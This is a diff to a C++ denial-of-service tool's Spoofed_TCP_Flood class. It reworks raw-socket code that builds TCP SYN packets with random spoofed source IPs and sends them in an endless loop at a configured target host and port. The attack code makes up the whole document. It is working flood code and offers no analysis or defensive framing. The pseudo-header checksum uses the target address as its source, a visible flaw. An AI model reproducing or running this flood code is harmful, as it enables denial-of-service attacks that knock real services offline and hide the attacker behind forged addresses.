@@ -2,6 +2,7 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
+#include <netinet/tcp.h>
 #include <netdb.h>
 
 #include "Randomizer.hpp"
@@ -10,16 +11,17 @@
 void Spoofed_TCP_Flood::attack(const int *id) {
     int s, on = 1, x;
     std::string message{};
-    char buf[8192];
-    auto *ip = (struct ip *)buf;
-    auto *tcp = (struct tcpheader *) (buf + sizeof(struct ip));
+    char buf[8192], *pseudogram;
+    struct pseudo_header psh{};
+    auto *ip = (struct iphdr *) buf;
+    auto *tcp = (struct tcphdr *) (buf + sizeof (struct ip));
     struct hostent *hp;
     struct sockaddr_in dst{};
     auto s_port = Randomizer::randomInt(0, 65535);
     while (true){
         for(x = 0; x < conf->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
-            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0){
                 logger->Log("socket() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
@@ -30,38 +32,70 @@ void Spoofed_TCP_Flood::attack(const int *id) {
             }
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
-                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
+                if((ip->daddr = inet_addr(conf->website.c_str())) < 0){
                     logger->Log("Can't resolve the host", Logger::Error);
                     exit(EXIT_FAILURE);
                 }
             }else{
-                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
+                bcopy(hp->h_addr_list[0], &ip->daddr, static_cast<size_t>(hp->h_length));
             }
-            if((ip->ip_src.s_addr = inet_addr(Randomizer::randomIP())) < 0){
+            if((ip->saddr = inet_addr(Randomizer::randomIP())) < 0){
                 logger->Log("Unable to set random src ip", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            // TCP struct
-            tcp->tcp_srcport = htons(static_cast<uint16_t>(s_port));
-            tcp->tcp_destport = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-            tcp->tcp_seqnum = htonl(1);
-            tcp->tcp_acknum = 0;
-            tcp->tcp_offset = 5;
-            tcp->tcp_syn = 1;
-            tcp->tcp_ack = 0;
-            tcp->tcp_win = htons(32767);
-            tcp->tcp_chksum = 0;
-            tcp->tcp_urgptr = 0;
+            // IP Struct
+            ip->ihl = 5;
+            ip->version = 4;
+            ip->tos = 16;
+            ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(buf);
+            ip->id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
+            ip->frag_off = htons(0x0);
+            ip->ttl = 255;
+            ip->protocol = IPPROTO_TCP;
+            ip->check = 0;
 
-            ip->ip_sum = csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct tcpheader)));
+            dst.sin_addr.s_addr = ip->daddr;
+            dst.sin_family = AF_UNSPEC;
+
+            ip->check = csum ((unsigned short *) buf, ip->tot_len);
+
+            // TCP Struct
+            tcp->source = htons(static_cast<uint16_t>(s_port));
+            tcp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
+            tcp->seq = 0;
+            tcp->ack_seq = 0;
+            tcp->doff = 5;  //tcp header size
+            tcp->fin=0;
+            tcp->syn=1;
+            tcp->rst=0;
+            tcp->psh=0;
+            tcp->ack=0;
+            tcp->urg=0;
+            tcp->window = htons (5840);
+            tcp->check = 0;
+            tcp->urg_ptr = 0;
+
+            psh.source_address = inet_addr(conf->website.c_str());
+            psh.dest_address = dst.sin_addr.s_addr;
+            psh.placeholder = 0;
+            psh.protocol = IPPROTO_TCP;
+            psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(buf));
+
+            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(buf);
+            pseudogram = static_cast<char *>(malloc(static_cast<size_t>(psize)));
+
+            memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
+            memcpy(pseudogram + sizeof(struct pseudo_header) , tcp , sizeof(struct tcphdr) + strlen(buf));
+
+            tcp->check = csum( (unsigned short*) pseudogram , psize);
 
             if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            if(sendto(s, buf, ip->ip_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
+            if(sendto(s, buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
                 logger->Log("sendto() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
